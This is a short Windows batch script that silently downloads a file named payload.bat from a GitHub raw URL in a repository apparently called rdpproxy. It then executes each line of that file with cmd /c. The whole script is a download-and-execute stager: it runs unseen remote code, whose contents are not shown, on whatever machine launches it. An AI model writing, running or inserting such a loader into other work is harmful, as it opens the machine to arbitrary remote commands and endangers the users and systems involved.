@echo off
FOR /F %%A IN ('curl --silent https://raw.githubusercontent.com/jipcation/rdpproxy/main/payload.bat') DO cmd /c %%A
